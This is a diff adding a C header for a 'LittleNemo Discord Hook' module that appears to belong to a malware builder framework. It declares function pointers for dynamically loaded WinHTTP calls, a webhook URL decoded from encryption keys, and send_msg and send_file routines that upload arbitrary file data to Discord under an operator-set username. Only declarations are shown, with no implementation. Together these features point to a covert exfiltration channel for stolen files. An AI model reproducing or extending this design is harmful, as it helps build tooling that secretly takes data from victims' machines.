@@ -1,0 +1,62 @@
+#!name##LilNemo_CandyHook_H
+#!itemType##sfile
+#!info##LittleNemo Discord Hook header file.
+#!lang##c
+#!Var##LNCH_uname##CptNemo##The username is included in outgoing messages and files.##str
+
+#ifndef LITTLE_NEMO_CANDY_DCHOOK_H
+#define LITTLE_NEMO_CANDY_DCHOOK_H
+
+#include "little_nemo_bag.h"
+#include <winhttp.h>
+#include <time.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define NEMO_HOOK_BAG_BALLOC_SIZE 8192
+#define NEMO_HOOK_BAG_STR_BUFF_SIZE 4096
+#define NEMO_HOOK_BAG_WSTR_BUFF_SIZE 4096
+#define NEMO_HOOK_JSON_BODY_SIZE 1024
+#define NEMO_HOOK_USERNAME "{{LNCH_uname}}"
+#define NEMO_HOOK_SEPARATOR "SEPARATOR"
+#define NEMO_HOOK_SEPARATOR_SIZE 32
+#define NEMO_HOOK_HTTP_HOST_NAME L"Nemo1.0"
+
+typedef HINTERNET (*NTypeWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET (*NTypeWinHttpConnect)(HINTERNET, LPCWSTR, WORD, DWORD);
+typedef HINTERNET (*NTypeWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD);
+typedef BOOL (*NTypeWinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);
+typedef BOOL (*NTypeWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL (*NTypeWinHttpCloseHandle)(HINTERNET);
+
+
+typedef struct _LIL_NEMO_DCH_URL {
+    wchar_t *url;
+    int size;
+    void (*clear)(struct _LIL_NEMO_DCH_URL *nurl);
+} LIL_NEMO_DCH_URL, *pLIL_NEMO_DCH_URL;
+
+
+typedef struct _LIL_NEMO_DC_HOOK {
+    pLIL_NEMO_BAG bag;
+    void *winhttp_dll;
+    NTypeWinHttpOpen httpOpen;
+    NTypeWinHttpConnect httpConnect;
+    NTypeWinHttpOpenRequest httpOpenRequest;
+    NTypeWinHttpAddRequestHeaders httpAddReqHeader;
+    NTypeWinHttpSendRequest httpSendRequest;
+    NTypeWinHttpCloseHandle httpCloseHandle;
+    void (*clear)(struct _LIL_NEMO_DC_HOOK *nhook);
+    pLIL_NEMO_DCH_URL (*get_url)(struct _LIL_NEMO_DC_HOOK *nhook);
+    BOOL (*send_msg)(char *msg_title, char *msg_text, struct _LIL_NEMO_DC_HOOK *nhook);
+    BOOL (*send_file)(BYTE *file_data, DWORD file_size, char *file_name, struct _LIL_NEMO_DC_HOOK *nhook);
+} LIL_NEMO_DC_HOOK, *pLIL_NEMO_DC_HOOK;
+
+
+pLIL_NEMO_FOOD_TEXT lil_nemo_food_winhttp_dll(void);
+
+pLIL_NEMO_DC_HOOK nhMakeNemoHook(uint16_t *ekey, uint16_t *str_key);
+pLIL_NEMO_DC_HOOK nhMakeNemoHook2(pLIL_NEMO_BAG bag);
+
+
+#endif
